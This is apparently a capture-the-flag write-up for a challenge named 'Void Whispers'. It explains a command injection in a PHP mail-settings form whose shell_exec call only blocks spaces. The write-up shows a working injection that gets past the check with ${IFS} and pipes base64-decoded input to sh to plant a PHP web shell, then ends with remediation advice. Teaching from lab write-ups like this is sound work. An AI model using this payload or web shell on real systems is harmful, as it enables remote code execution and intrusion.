# Void Whispers
- difficulty: very easy
- vulnerabilities: command injection

## App Review
The app presents a form to the user that appears to be used for configuration of a backend email system.  The form has 4 fields: From Name, From Email, Sendmail PATH, and Mail Program.

## Code Review
As always, I'll start by checking to see what happens to flag.  Looking at the Dockerfile I can see that the flag.txt file is copied into the root dir.  Since there are no other references to flag.txt within the source code of the app, I know that I'm looking for an arbitrary file read or command/code execution vulnerability.

The initial App Review showed a POST of 2 very interesting fields: Sendmail PATH and Mail Program.  I find these fields interesting because they reference something on the linux filesystem so I initially look at how the user input from these fields is being handled.  One of the fields, sendMailPath, is being validated to make sure the path exists and if it does exist then it is being written to a config.json file with the user input from the other 3 fields.  However, the mechansim for validating the sendMailPath user input is insecure and vulnerable to command injection.

```
// filename: controllers/IndexController.php

if (preg_match('/\s/', $sendMailPath)) {
  return $router->jsonify(['message' => 'Sendmail path should not contain spaces!', 'status' => 'danger'], 400);
}

$whichOutput = shell_exec("which $sendMailPath");
if (empty($whichOutput)) {
  return $router->jsonify(['message' => 'Binary does not exist!', 'status' => 'danger'], 400);
}
```
The code does attempt to do some sanitization by rejecting any input that contains spaces, however, this is inadequate as an attacker can use ```${IFS}``` as a substitue.  Since the sendMailPath is being used in a shell command with inadequate sanitization, an attacker may inject into the string to execute their own shell commands.

## Attack
Since the web app does not provide any output from the command, the vector here is to upload a php web shell to the /www directory then call it with a GET request.  Another approach is to read the contents of the file and send it back to a host that the attacker controls.  For the sake of codability, I'll use the first approach.  It's easiest to see how this works by referencing the solve.py script.
```
php = '<?php system($_GET["cmd"]); ?>'
cmd = f'echo \'{php}\' > /www/rev.php'
cmd = base64.b64encode(cmd.encode()).decode()

data = {
    'from': 'meowName',
    'email': 'meow@email.com',
    'sendMailPath': f'/usr/sbin/sendmail & echo {cmd}|base64 -d|sh',
    'mailProgram': 'sendmail',
}
```
As a result, the shell command that gets executed via ```shell_exec``` will being:
```
/usr/sbin/sendmail${IFS}&${IFS}echo${IFS}ZWNobyAnPD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+JyA+IC93d3cvcmV2LnBocA==|base64${IFS}-d|sh
```

## Remediation
The best thing to do here is to NEVER let user input get into the ```shell_exec``` command.  In this case, the machanism should probably just be removed and replaced.  For example, instead of allowing the user to input any mail program, they can select from a few predefined options.  The path to the mailProgram can then be hardcoded into the backend.  This way ```shell_exec``` is no longer needed.